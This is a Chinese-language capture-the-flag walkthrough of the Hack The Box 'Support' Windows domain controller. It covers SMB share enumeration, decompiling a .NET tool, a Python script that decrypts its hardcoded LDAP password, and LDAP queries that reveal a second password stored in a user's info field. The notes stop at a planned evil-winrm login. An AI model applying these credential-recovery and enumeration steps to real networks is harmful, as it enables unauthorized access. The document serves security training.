## Support
```
[★]$ nmap 10.129.230.181 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-29 03:08 CST
Nmap scan report for 10.129.230.181
Host is up (0.0092s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 09:08:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-29T09:08:47
|_  start_date: N/A

[★]$ echo '10.129.230.181 support.htb' | sudo tee -a /etc/hosts
```
#### Nmap扫描显示了大量开放端口，其中大多数表明底层操作系统是Windows。的开放的端口有389 （LDAP）、636 （LDAPS）、445 （SMB）和5985（WinRM）。作为没有web服务器在任何端口上监听，因为这是一个Windows系统，让我们检查一下有任何开放的SMB共享可用。
#### Web 服务器不一定只在 80 / 443 端口上提供服务，它可以监听在“任何端口”上
```
[★]$ smbclient -L \\\\10.129.230.181\\
Password for [WORKGROUP\syareya55]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
#### 从可用的共享来看，support-tools似乎很有趣，因为它不是默认共享。让我们试着连接并列出可用文件。
```
[★]$ smbclient \\\\10.129.230.181\\support-tools
Password for [WORKGROUP\syareya55]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 12:01:06 2022
  ..                                  D        0  Sat May 28 06:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022

		4026367 blocks of size 4096. 959284 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (2631.0 KiloBytes/sec) (average 2631.0 KiloBytes/sec)
smb: \> exit
```
#### 实际上，我们能够匿名地连接到共享并列出可用的文件。该共享包含很少有应用程序安装程序，如putty或WireShark，但有一个文件脱颖而出。特别zip看起来不像是一个知名的应用程序。让我们将其下载到本地并进行研究进一步。
```
[★]$ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
[★]$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
#### 检查“UserInfo.exe”的文件类型，发现它是一个。净可执行。因为我们使用的是Linux系统我们有两种方法。反编译可执行文件，看看它做什么或使用Wine尝试运行它。
### ILSpy
#### ILSpy的反编译. Net可执行文件，我们可以使用Avalonia ILspy，这是一个跨平台的版本在Linux上运行的ILSpy。首先让我们从发布页面下载它。
https://github.com/icsharpcode/AvaloniaILSpy
https://github.com/icsharpcode/AvaloniaILSpy/releases
```
[★]$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
[★]$ unzip Linux.x64.Release.zip
Archive:  Linux.x64.Release.zip
  inflating: ILSpy-linux-x64-Release.zip  
[★]$ unzip ILSpy-linux-x64-Release.zip

[★]$ uname -a
Linux htb-yjm93nlfxd 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 GNU/Linux
[★]$ ls artifacts/
linux-x64

[★]$ cd artifacts/linux-x64
[★]$  ./ILSpy  //开启 X11

```
#### 现在让我们加载UserInfo可执行文件，以便对其进行反编译。点击文件，选择打开，找到在文件浏览器中找到目标二进制文件并选择它。
#### 导入二进制文件后，ILSpy将负责反编译，我们将能够查看源代码。看一下代码，我们很快注意到一个名为LdapQuery的函数以及另外两个函数函数FindUser和GetUser。
#### 点击UserInfo.Services->LdapQuery
```
public LdapQuery()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		string password = Protected.getPassword();
		entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
		entry.set_AuthenticationType((AuthenticationTypes)1);
		ds = new DirectorySearcher(entry);
	}
```
#### 点击UserInfo.Services->Protected
```
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```
#### 通过LDAP服务器进行身份验证的密码是从Protected.getPassword（）中获取的函数。
#### 密码似乎是用异或加密的。解密过程如下：enc密码字符串经过Base64解码并放入字节数组中。创建第二个名为array2的字节数组，其值与array相同。初始化一个循环，循环遍历数组中的每个字符，并用键的一个字母对其进行xor然后是字节0xDFu（223）。最后，返回解密后的密钥。
#### 让我们创建一个执行解密过程的Python脚本
```
[★]$ vi decrypt.py
[★]$ cat decrypt.py
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
[★]$ python3 decrypt.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
#### 脚本打印出解密后的密码，我们可以继续连接到LDAP服务器进行收集信息。
### Wine
#### 确定UserInfo.exe功能的第二种方法是使用Wine，这是一个可以运行的应用程序在Linux系统上运行Windows应用程序。
```
[★]$ sudo apt install wine -y
err:mscoree:CLRRuntimeInfo_GetRuntimeHost Wine Mono is not installed //不适合装wine
```
#### 注意：二进制文件实际上是LDAP查询可注入的，但是，这只能通过Windows工作。上述失败可能是由于Wine是一个不完美的软件，并且在某个地方执行二进制文件失败，并且无法识别名称。我们知道二进制连接到并以某种方式进行身份验证，因此让我们启动WireShark并捕获网络流量，看看我们是否可以获取用于身份验证的用户名和密码。启动WireShark，开始抓包tun0接口。然后运行二进制文件

#### 在WireShark中捕获LDAP认证，单击bindRequest包会显示正在使用用户名和密码组合。具体来说，我们可以导航到轻量级目录访问协议，打开protocolOp，然后打开bindRequest以确定用户名支持\ldap。最后，我们可以选择身份验证来查看密码nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz。LDAP身份验证是在WireShark中捕获的，单击bindRequest包会显示正在使用用户名和密码组合。具体来说，我们可以导航到轻量级目录访问协议
```
1️⃣ 打开 Wireshark
2️⃣ 选 tun0
3️⃣ 过滤：tcp.port == 389
4️⃣ 运行：wine UserInfo.exe
5️⃣ 找 bindRequest
6️⃣ 看 authentication
```
#### 最终是为了验证密码，同上的，Wireshark使用不成功，同wine。
### Foothold
#### 获得上述凭据之后，让我们连接到LDAP服务器，看看是否可以找到任何凭据有趣的信息。要连接，我们可以使用ldapsearch实用程序。让我们来安装它。
```
[★]$ sudo apt install ldap-utils
```
#### 安装好实用程序之后，让我们尝试使用ldap@support.htb作为对象绑定到LDAP服务器BindDN带有-D标志，并指定support和hth作为带有-b标志的域组件。
```
//第一步：测试能否 bind
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(objectClass=*)"

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful  //这里密码
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

----------------------
//第二步：查管理员
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(sAMAccountName=Administrator)"
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (sAMAccountName=Administrator)
# requesting: ALL
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20260129090309.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
uSNChanged: 90151
name: Administrator
objectGUID:: ltGa4T+PO0uTHnjAEEcLlw==
userAccountControl: 512

----------------------
//第三步：枚举所有用户
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName
```
#### 当连接到LDAP服务器时，BindDN可以被视为一种用户名或帐户我们连接到LDAP服务器，并提供查看和编辑LDAP服务器中的对象的权限。另一方面，域组件可以被认为是LDAP中的目录结构。他们是从右到左读取并指示服务器在哪里查找以及为我们获取哪些对象。在这种情况下我们指示服务器转到HTB域组件，找到支持域组件和然后以Administrator的名称搜索其中的任何对象。上面的命令返回
### Apache Directory Studio
#### 除了ldapsearch，我们还可以使用Apache Directory Studio程序，它可以从这里下载。它提供了一个图形界面，可以用来更有效地查看LDAP数据。下载并在本地运行它
https://directory.apache.org/studio/
```
[★]$ gunzip ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
[~/Downloads][★]$ ls
 ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar
[~/Downloads][★]$ tar -xvf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar
[★]$ cd ApacheDirectoryStudio
[~/Downloads/ApacheDirectoryStudio][★]$ ls
ApacheDirectoryStudio      artifacts.xml  features  LICENSE  p2
ApacheDirectoryStudio.ini  configuration  icon.xpm  NOTICE   plugins
[~/Downloads/ApacheDirectoryStudio][★]$ ./ApacheDirectoryStudio
```
#### 接下来，让我们通过单击屏幕左上角的LDAP按钮来添加到LDAP服务器的连接。
#### LDAP --> New Connetction
![图片](mages/2026013002.png)
#### 输入Support作为连接名称，支持。作为主机名，然后单击Next
```
Bind DN or suer: ldap@support.htb
Bind password:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz  //Ctrl+V
点击Finish
```
#### 在下一个窗口中，确保选择Simple Authentication作为身份验证方法，以“ldap@support.htb”为绑定DN，并粘贴密码为“nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz”在绑定密码字段中。然后单击检查身份验证按钮，以确保一切能正常工作
#### 回到Apache Directory Studio实用程序的主屏幕，我们可以在左下角。双击它将允许我们连接到远程LDAP服务器并列出所有LDAP对象。
```
//会出现的问题,连接超时
Error while opening connection
 -  MSG_04177_CONNECTION_TIMEOUT (5000)
org.apache.directory.studio.connection.core.io.StudioLdapException:  MSG_04177_CONNECTION_TIMEOUT (5000)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.toStudioLdapException(DirectoryApiConnectionWrapper.java:1350)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.access$2(DirectoryApiConnectionWrapper.java:1342)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:258)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.runAndMonitor(DirectoryApiConnectionWrapper.java:1261)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.doConnect(DirectoryApiConnectionWrapper.java:280)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.connect(DirectoryApiConnectionWrapper.java:144)
	at org.apache.directory.studio.connection.core.jobs.OpenConnectionsRunnable.run(OpenConnectionsRunnable.java:111)
	at org.apache.directory.studio.connection.core.jobs.StudioConnectionJob.run(StudioConnectionJob.java:109)
	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)
Caused by: org.apache.directory.ldap.client.api.exception.LdapConnectionTimeOutException: MSG_04177_CONNECTION_TIMEOUT (5000)
	at org.apache.directory.ldap.client.api.LdapNetworkConnection.tryConnect(LdapNetworkConnection.java:732)
	at org.apache.directory.ldap.client.api.LdapNetworkConnection.connect(LdapNetworkConnection.java:970)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:227)
	... 6 more

 MSG_04177_CONNECTION_TIMEOUT (5000)

安装官方文档的下一步是：在打开DC=support，DC=htb之后，我们注意到一个具有Common Name of users的对象。这个对象包含远程计算机上的所有系统用户。让我们打开它，进一步列举。
在文件夹CN=support  -->’Attribute Description‘:info有密码

同上比较：
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful  //这里密码

info 字段本来常见内容应该是：
“IT Support Account”
“Temporary account”
“Helpdesk user”
```
#### 在用户列表中，有一个似乎很突出，叫做“支持”。查看这个用户的属性，我们发现a非默认标签名为info，值为Ironside47pleasure40Watchful。这看起来很像密码。再往下看，我们还可以看到该用户是Remote Management Users的成员组，允许它们通过WinRM进行连接。为此，让我们尝试使用evil-winrm来连接使用已识别的密码远程联系支持用户。
